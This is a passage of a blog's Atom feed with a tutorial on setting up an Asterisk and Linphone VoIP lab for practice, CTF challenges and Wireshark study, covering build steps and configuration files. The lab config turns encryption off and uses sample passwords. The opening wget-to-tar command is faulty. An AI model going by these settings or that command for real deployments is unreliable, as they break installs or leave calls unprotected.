<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>g4rud4kun</title>
  
  <subtitle>My Blog</subtitle>
  <link href="https://g4rud4kun.github.io/atom.xml" rel="self"/>
  
  <link href="https://g4rud4kun.github.io/"/>
  <updated>2025-05-29T21:10:06.251Z</updated>
  <id>https://g4rud4kun.github.io/</id>
  
  <author>
    <name>Harsh</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VoIP Setup for Beginners: Daily Use, CTF Challenges, and Wireshark Deep Dive</title>
    <link href="https://g4rud4kun.github.io/2025/05/28/VoIP-Setup-for-Beginners-Daily-Use-CTF-Challenges-and-Wireshark-Deep-Dive/"/>
    <id>https://g4rud4kun.github.io/2025/05/28/VoIP-Setup-for-Beginners-Daily-Use-CTF-Challenges-and-Wireshark-Deep-Dive/</id>
    <published>2025-05-28T14:45:00.000Z</published>
    <updated>2025-05-29T21:10:06.251Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Voice-over-Internet-Protocol"><a href="#Voice-over-Internet-Protocol" class="headerlink" title="Voice over Internet Protocol"></a>Voice over Internet Protocol</h2><p>Hola folks!<br>I’m Harsh aka G4RUD4, and today I’m sharing a beginner-friendly guide to setting up a VoIP environment. Whether you’re looking to experiment with VoIP tech, dive into packet-level analysis using Wireshark, or build challenges for cybersecurity CTFs, this post has you covered.</p><h3 id="What-is-VoIP"><a href="#What-is-VoIP" class="headerlink" title="What is VoIP?"></a>What is VoIP?</h3><p>VoIP (Voice over Internet Protocol) allows you to make voice and video calls over the internet instead of traditional phone lines. It converts analog voice signals into digital data that travels over IP networks.</p><p>Here’s a simple diagram to show how it works:</p><p><img src="/images/posts/2025-voip/what-is-VoIP-Phone-Diagram.jpg" alt="Basic Workflow"></p><p><img src="/images/posts/2025-voip/Introduction-to-VOIP-Phone.webp" alt="Image3"></p><h3 id="What-You’ll-Need"><a href="#What-You’ll-Need" class="headerlink" title="What You’ll Need"></a>What You’ll Need</h3><p>You can either use two VMs or, like me, run one instance on Windows and another on a Linux VM (Ubuntu 24.04 on Oracle VirtualBox).</p><p>Required Tools:</p><ul><li><p>Asterisk (v22.1.0) – Acts as your VoIP server</p></li><li><p>Linphone (v5.0.2) – A softphone for making calls</p></li></ul><h3 id="Setting-Up-Asterisk-Server-on-Ubuntu"><a href="#Setting-Up-Asterisk-Server-on-Ubuntu" class="headerlink" title="Setting Up Asterisk Server on Ubuntu"></a>Setting Up Asterisk Server on Ubuntu</h3><p>Open your terminal and run:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.asterisk.org/pub/telephony/asterisk/asterisk-22.4.1.tar.gz | tar -zxvf asterisk-22.4.1.tar.gz</span><br></pre></td></tr></table></figure><p>&#96;</p><blockquote><p> I used <code>asterisk-22.1.0.tar.gz</code>, so update the version as needed.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install build-essential libssl-dev libncurses5-dev libnewt-dev libxml2-dev libsqlite3-dev uuid-dev libedit-dev libjansson-dev sqlite3</span><br></pre></td></tr></table></figure><p>Navigate to the Asterisk folder and enable SIP and RTP modules before building:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> make menuselect</span><br></pre></td></tr></table></figure><p>Enable chan_pjsip and chan_rtp modules. Save and exit.</p><p><img src="/images/posts/2025-voip/menuselect.png" alt="menuselect"></p><p>Then run the following commands one by one or by script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br><span class="line"><span class="built_in">sudo</span> make samples</span><br><span class="line"><span class="built_in">sudo</span> make config</span><br></pre></td></tr></table></figure><p>This will take some time. Be patient!</p><h3 id="Configuring-Asterisk"><a href="#Configuring-Asterisk" class="headerlink" title="Configuring Asterisk"></a>Configuring Asterisk</h3><p>Edit these files in &#x2F;etc&#x2F;asterisk&#x2F;:</p><p>pjsip.conf – SIP user and transport configs</p><p>extensions.conf – Dialplan logic</p><p><code>&#39;;&#39; is for the comments</code></p><p>pjsip.conf:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">[101]</span><br><span class="line">auth=101 ; we are using username as 101</span><br><span class="line">aors=101</span><br><span class="line">type=endpoint</span><br><span class="line">context=internal</span><br><span class="line">message_context=internal</span><br><span class="line">transport=udp_transport ; Mention the transport protocol you want to use</span><br><span class="line">language=en</span><br><span class="line">deny=0.0.0.0/0.0.0.0</span><br><span class="line">permit=192.168.0.0/24</span><br><span class="line">disallow=all</span><br><span class="line">allow=h264,opus ; The protocols which you want to allow</span><br><span class="line">rtp_symmetric=yes</span><br><span class="line">force_rport=yes</span><br><span class="line">rewrite_contact=yes ; If you want to rewrite existing contact then keep &#x27;yes&#x27;</span><br><span class="line">direct_media=no ; We are using softphone and we don&#x27;t want users to share directly</span><br><span class="line">outbound_auth=101</span><br><span class="line">dtmf_mode=rfc4733 ; If you want to use the dial pad which uses DTMF protocol</span><br><span class="line">tos_audio=ef              ; Audio RTP</span><br><span class="line">tos_video=af41            ; Video RTP</span><br><span class="line">cos_audio=5               ; Audio RTP CoS</span><br><span class="line">cos_video=4               ; Video RTP CoS</span><br><span class="line">force_avp=yes</span><br><span class="line">media_encryption=no</span><br><span class="line">callerid=&quot;101&quot; &lt;101&gt;</span><br><span class="line"></span><br><span class="line">[101]</span><br><span class="line">type=aor</span><br><span class="line">qualify_frequency=30</span><br><span class="line">;contact=sip:101@192.168.0.104:5060</span><br><span class="line">max_contacts=1</span><br><span class="line">remove_existing=yes ;  If you want to rewrite existing contact then keep &#x27;yes&#x27;</span><br><span class="line"></span><br><span class="line">[101]</span><br><span class="line">type=auth</span><br><span class="line">auth_type=userpass</span><br><span class="line">username=101</span><br><span class="line">password=linphone_password1</span><br><span class="line"></span><br><span class="line">[102]</span><br><span class="line">auth=102 ; user as 102</span><br><span class="line">aors=102</span><br><span class="line">type=endpoint</span><br><span class="line">context=internal</span><br><span class="line">message_context=internal</span><br><span class="line">transport=udp_transport</span><br><span class="line">language=en</span><br><span class="line">deny=0.0.0.0/0.0.0.0</span><br><span class="line">permit=192.168.0.0/24</span><br><span class="line">disallow=all</span><br><span class="line">allow=h264,opus</span><br><span class="line">rtp_symmetric=yes</span><br><span class="line">force_rport=yes</span><br><span class="line">rewrite_contact=yes</span><br><span class="line">direct_media=no</span><br><span class="line">outbound_auth=102</span><br><span class="line">dtmf_mode=rfc4733</span><br><span class="line">tos_audio=ef              ; Audio RTP</span><br><span class="line">tos_video=af41            ; Video RTP</span><br><span class="line">cos_audio=5               ; Audio RTP CoS</span><br><span class="line">cos_video=4               ; Video RTP CoS</span><br><span class="line">force_avp=yes</span><br><span class="line">media_encryption=no</span><br><span class="line">callerid=&quot;102&quot; &lt;102&gt;</span><br><span class="line"></span><br><span class="line">[102]</span><br><span class="line">type=aor</span><br><span class="line">qualify_frequency=30</span><br><span class="line">;contact=sip:102@192.168.0.104:5060</span><br><span class="line">max_contacts=1</span><br><span class="line">remove_existing=yes</span><br><span class="line"></span><br><span class="line">[102]</span><br><span class="line">type=auth</span><br><span class="line">auth_type=userpass</span><br><span class="line">username=102</span><br><span class="line">password=linphone_password2</span><br><span class="line"></span><br><span class="line">[udp_transport]</span><br><span class="line">type=transport</span><br><span class="line">protocol=udp</span><br><span class="line">bind=0.0.0.0:5060</span><br><span class="line">local_net=192.168.0.0/24</span><br><span class="line">;external_media_address=192.168.0.104 ; Replace with your Asterisk server&#x27;s local IP</span><br><span class="line">;external_signaling_address=192.168.0.104 ; Replace with your Asterisk server&#x27;s local IP</span><br><span class="line">tos=cs3                   ; SIP signaling</span><br><span class="line">cos=3                     ; SIP signaling CoS</span><br><span class="line"></span><br><span class="line">allow_reload=false</span><br></pre></td></tr></table></figure><p>extensions.conf:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">[internal]</span><br><span class="line">; Call handling for endpoints</span><br><span class="line">exten =&gt; 101,1,Dial(PJSIP/101,60)</span><br><span class="line">exten =&gt; 101,n,Hangup()</span><br><span class="line"></span><br><span class="line">exten =&gt; 102,1,Dial(PJSIP/102,60)</span><br><span class="line">exten =&gt; 102,n,Hangup()</span><br><span class="line"></span><br><span class="line">; Handle sending messages (plain text or file)</span><br><span class="line">; Extension 105 sends to 102</span><br><span class="line"></span><br><span class="line">; Handle sending messages (plain text)</span><br><span class="line">exten =&gt; 105,1,Verbose(1, &quot;Sending a message from 101 to 102&quot;)</span><br><span class="line"></span><br><span class="line"> same =&gt; n,Set(MESSAGE(body)=We will talk further on VoIP)</span><br><span class="line"></span><br><span class="line"> ;same =&gt; n,Set(MESSAGE(body)=Hey X1E, I hope you&#x27;re doing well. I&#x27;ll be sending some data shortly.)</span><br><span class="line"></span><br><span class="line"> ;same =&gt; n,Set(MESSAGE(body)=Any Message, you can also share the file as base64)</span><br><span class="line"></span><br><span class="line"> ;same =&gt; n,Set(MESSAGE(body)=$&#123;FILE(/home/dr4k3n/Downloads/alwoeenveoivr)&#125;)</span><br><span class="line"> ;same =&gt; n,Set(MESSAGE(body)=$&#123;FILE(/home/dr4k3n/Downloads/delervierveiv)&#125;)</span><br><span class="line"> ;same =&gt; n,Set(MESSAGE(body)=$&#123;FILE(/home/dr4k3n/Downloads/syveiubviesveve)&#125;)</span><br><span class="line"></span><br><span class="line"> same =&gt; n,MessageSend(pjsip:102@192.168.0.104:5060,sip:101@192.168.0.104:5060,sip:102@192.168.0.104:5060)  ; Send the message using MessageSend() through ASTERISK. </span><br><span class="line"></span><br><span class="line"> ;same =&gt; n,MessageSend(pjsip:102@192.168.0.101:5060,sip:101@192.168.0.104:5061,sip:102@192.168.0.101:5060)  ; Send the message using MessageSend() Directly through IP. &#123;Check the IP, username and port&#125;</span><br><span class="line"></span><br><span class="line"> same =&gt; n,GotoIf($[&quot;$&#123;MESSAGE_SEND_STATUS&#125;&quot; = &quot;SUCCESS&quot;]?sent:failed)</span><br><span class="line"> same =&gt; n(sent),Verbose(1, &quot;Message sent successfully from 101 to 102&quot;)</span><br><span class="line"> same =&gt; n,Hangup()</span><br><span class="line"> same =&gt; n(failed),Verbose(1, &quot;Failed to send message: $&#123;MESSAGE_SEND_STATUS&#125;&quot;)</span><br><span class="line"> same =&gt; n,Hangup()</span><br><span class="line"></span><br><span class="line">; Handle sending messages (plain text)</span><br><span class="line">exten =&gt; 106,1,Verbose(1, &quot;Sending a message from 102 to 101&quot;)</span><br><span class="line"> ;same =&gt; n,Set(MESSAGE(body)=I&#x27;m good, hope you&#x27;re doing well too. Don&#x27;t forget to do VC, GET AWAY ASAP.)</span><br><span class="line"> same =&gt; n,Set(MESSAGE(body)=Gotcha)</span><br><span class="line"></span><br><span class="line"> same =&gt; n,MessageSend(pjsip:101@192.168.0.104:5060,sip:102@192.168.0.104:5060,sip:101@192.168.0.104:5060)  ; Send the message using MessageSend() Through ASTERISK</span><br><span class="line"></span><br><span class="line"> ;same =&gt; n,MessageSend(pjsip:101@192.168.0.104:5061,sip:102@192.168.0.101:5060,sip:101@192.168.0.104:5061)  ; Send the message using MessageSend() Directly through IP</span><br><span class="line"></span><br><span class="line"> same =&gt; n,GotoIf($[&quot;$&#123;MESSAGE_SEND_STATUS&#125;&quot; = &quot;SUCCESS&quot;]?sent:failed)</span><br><span class="line"> same =&gt; n(sent),Verbose(1, &quot;Message sent successfully from 101 to 102&quot;)</span><br><span class="line"> same =&gt; n,Hangup()</span><br><span class="line"> same =&gt; n(failed),Verbose(1, &quot;Failed to send message: $&#123;MESSAGE_SEND_STATUS&#125;&quot;)</span><br><span class="line"> same =&gt; n,Hangup()</span><br><span class="line"></span><br><span class="line">; Handle SIP MESSAGE requests</span><br><span class="line">exten =&gt; _MESSAGE.,1,NoOp(Handling SIP MESSAGE)</span><br><span class="line"> same =&gt; n,Set(ACTUAL_TO=$&#123;CUT(MESSAGE(to),@,1)&#125;)  ; Extract the recipient</span><br><span class="line"> same =&gt; n,MessageSend($&#123;ACTUAL_TO&#125;,sip:$&#123;MESSAGE(from)&#125;)  ; Send the message</span><br><span class="line"> same =&gt; n,NoOp(Send status: $&#123;MESSAGE_SEND_STATUS&#125;)  ; Log the send status</span><br><span class="line"> same =&gt; n,GotoIf($[&quot;$&#123;MESSAGE_SEND_STATUS&#125;&quot;=&quot;SUCCESS&quot;]?success:fail)</span><br><span class="line"></span><br><span class="line">; On success</span><br><span class="line"> same =&gt; n(success),Verbose(1, Message sent successfully)</span><br><span class="line"> same =&gt; n,Hangup()</span><br><span class="line"></span><br><span class="line">; On failure</span><br><span class="line"> same =&gt; n(fail),Verbose(1, Failed to send message: $&#123;MESSAGE_SEND_STATUS&#125;)</span><br><span class="line"> same =&gt; n,Hangup()</span><br><span class="line"></span><br><span class="line">; Echo test</span><br><span class="line">exten =&gt; 200,1,Answer()</span><br><span class="line">exten =&gt; 200,n,Echo()</span><br><span class="line">exten =&gt; 200,n,Hangup()</span><br><span class="line"></span><br><span class="line">; Handle DTMF input</span><br><span class="line">exten =&gt; _X.,1,Set(CHANNEL(dtmfmode)=rfc2833)</span><br><span class="line">exten =&gt; _X.,n,Playback(digits/$&#123;EXTEN&#125;)</span><br><span class="line">exten =&gt; _X.,n,Hangup()</span><br></pre></td></tr></table></figure><p>You configure it for the call, messages, files sharing, DTMF(Dial Pad).</p><p>Let’s ensure Asterisk loads the ‘chan_pjsip’ module. We can do this by opening the ‘module.conf’ file and updating a specific line.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[modules]</span><br><span class="line">autoload=yes</span><br></pre></td></tr></table></figure><p>Make sure autoload is yes.</p><h3 id="Starting-Asterisk-Server"><a href="#Starting-Asterisk-Server" class="headerlink" title="Starting Asterisk Server"></a>Starting Asterisk Server</h3><p>Now we are done. Start Asterisk with:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> asterisk -r</span><br><span class="line"><span class="built_in">sudo</span> asterisk -rvvvvvvvvv</span><br></pre></td></tr></table></figure><p>for verbosity -^</p><p><img src="/images/posts/2025-voip/asterisk_server.png" alt="Asterisk Server"></p><p>Now if you update in the files like pjsip.conf and extensions.conf then you have to run these commands to reload the configurations:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> asterisk -rx <span class="string">&quot;dialplan reload&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> asterisk -rx <span class="string">&quot;pjsip reload&quot;</span></span><br><span class="line">OR</span><br><span class="line"><span class="built_in">sudo</span> asterisk -rx <span class="string">&quot;core reload&quot;</span></span><br></pre></td></tr></table></figure><p>For a complete reload -^</p><p>To manage the service:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart asterisk</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> asterisk</span><br><span class="line"><span class="built_in">sudo</span> systemctl status asterisk</span><br></pre></td></tr></table></figure><p>If you run the <code>pjsip show endpoints</code> in the asterisk terminal</p><p>You will see this as the output:</p><p><img src="/images/posts/2025-voip/endpoints.png" alt="Endpoints"></p><p>If the softphone is not yet connected, the status will show as “Unavailable.”</p><p>Enable debugging by running it in asterisk terminal:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pjsip <span class="built_in">set</span> logger on</span><br><span class="line">rtp <span class="built_in">set</span> debug on</span><br></pre></td></tr></table></figure><p>pjsip log:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dr4k3n*CLI&gt; pjsip set logger on</span><br><span class="line">PJSIP Logging enabled</span><br><span class="line">&lt;--- Transmitting SIP request (421 bytes) to UDP:192.168.0.104:5060 ---&gt;</span><br><span class="line">OPTIONS sip:102@192.168.0.104:5060 SIP/2.0</span><br><span class="line">Via: SIP/2.0/UDP 192.168.0.104:5060;rport;branch=z9hG4bKPj78497896-090d-491a-babc-a1fdf67fa07d</span><br><span class="line">From: &lt;sip:101@192.168.0.104&gt;;tag=1b1058dd-748f-457c-a6b4-2f720ffb4865</span><br><span class="line">To: &lt;sip:102@192.168.0.104&gt;</span><br><span class="line">Contact: &lt;sip:101@192.168.0.104:5060&gt;</span><br><span class="line">Call-ID: b6032719-63e3-4cf7-8285-11064df2db92</span><br><span class="line">CSeq: 25292 OPTIONS</span><br><span class="line">Max-Forwards: 70</span><br><span class="line">User-Agent: Asterisk PBX 22.1.0</span><br><span class="line">Content-Length:  0</span><br></pre></td></tr></table></figure><p>It continously sends SIP to establish the connection between Asterisk Server and Liphones.</p><h3 id="Setting-Up-Linphone-Softphone"><a href="#Setting-Up-Linphone-Softphone" class="headerlink" title="Setting Up Linphone (Softphone)"></a>Setting Up Linphone (Softphone)</h3><p>We’ll use Linphone to connect with our Asterisk server. Other softphone alternatives include MicroSIP, Zoiper, and Mizudroid (Android).</p><blockquote><p>If Linphone doesn’t work on your Asterisk server machine, try Zoiper instead.</p></blockquote><p>Open Required Ports:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ufw allow 5060/udp</span><br><span class="line"><span class="built_in">sudo</span> ufw allow 10000:20000/udp</span><br></pre></td></tr></table></figure><p>Use the same version of Linphone on both Windows and Linux to avoid compatibility issues.</p><p>For Ubuntu OS:</p><p>~&#x2F;.config&#x2F;linphone&#x2F;linphonerc file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line">[messaging]</span><br><span class="line">use_cpim=0</span><br><span class="line">default_content_type=text/plain</span><br><span class="line"></span><br><span class="line">[misc]</span><br><span class="line">log_collection_upload_server_url=https://www.linphone.org:444/lft.php</span><br><span class="line">empty_chat_room_deletion=1</span><br><span class="line">prefer_basic_chat_room=1</span><br><span class="line">uuid=d6ef36a5-972b-0091-9814-1225cc002681</span><br><span class="line">hide_empty_chat_rooms=1</span><br><span class="line">file_transfer_server_url=https://www.linphone.org:444/lft.php</span><br><span class="line"></span><br><span class="line">[sound]</span><br><span class="line">ec_filter=MSWebRTCAEC</span><br><span class="line">playback_dev_id=PulseAudio Unknown: Built-in Audio Analog Stereo</span><br><span class="line">ringer_dev_id=PulseAudio Unknown: Built-in Audio Analog Stereo</span><br><span class="line">capture_dev_id=PulseAudio Unknown: Built-in Audio Analog Stereo</span><br><span class="line">media_dev_id=PulseAudio Unknown: Built-in Audio Analog Stereo</span><br><span class="line">mic_gain_db=0.000000</span><br><span class="line">playback_gain_db=0.000000</span><br><span class="line">remote_ring=/usr/share/sounds/linphone/ringback.wav</span><br><span class="line">disable_record_on_mute=0</span><br><span class="line">ec_delay=-1</span><br><span class="line"></span><br><span class="line">[app]</span><br><span class="line">record_aware=1</span><br><span class="line">auto_download_incoming_files_max_size=10000000</span><br><span class="line">auto_download_incoming_voice_recordings=1</span><br><span class="line">auto_download_incoming_icalendars=1</span><br><span class="line">sender_name_hidden_in_forward_message=0</span><br><span class="line"></span><br><span class="line">[rtp]</span><br><span class="line">accept_any_encryption=1</span><br><span class="line">audio_rtp_port=10000</span><br><span class="line">video_rtp_port=12000</span><br><span class="line">text_rtp_port=11078</span><br><span class="line">audio_jitt_comp=60</span><br><span class="line">video_jitt_comp=60</span><br><span class="line">nortp_timeout=30</span><br><span class="line">audio_adaptive_jitt_comp_enabled=1</span><br><span class="line">video_adaptive_jitt_comp_enabled=1</span><br><span class="line">audio_dscp=0xb8</span><br><span class="line">video_dscp=0x88</span><br><span class="line"></span><br><span class="line">[sip]</span><br><span class="line">chat_messages_aggregation_delay=1000</span><br><span class="line">chat_messages_aggregation=1</span><br><span class="line">zrtp_key_agreements_suites=MS_ZRTP_KEY_AGREEMENT_K255_KYB512</span><br><span class="line">root_ca=/usr/share/linphone/rootca.pem</span><br><span class="line">verify_server_certs=1</span><br><span class="line">verify_server_cn=1</span><br><span class="line">contact=sip:dr4k3n@unknown-host</span><br><span class="line">auto_send_ringing=1</span><br><span class="line">media_encryption=none</span><br><span class="line">supported=replaces, outbound, gruu, path, record-aware</span><br><span class="line">user_agent=Linphone Desktop/5.0.2 (dr4k3n) Ubuntu 24.04.1 LTS, Qt 5.15.13 LinphoneCore/5.2.0</span><br><span class="line">default_proxy=0</span><br><span class="line">guess_hostname=1</span><br><span class="line">inc_timeout=30</span><br><span class="line">in_call_timeout=0</span><br><span class="line">delayed_timeout=4</span><br><span class="line">register_only_when_network_is_up=1</span><br><span 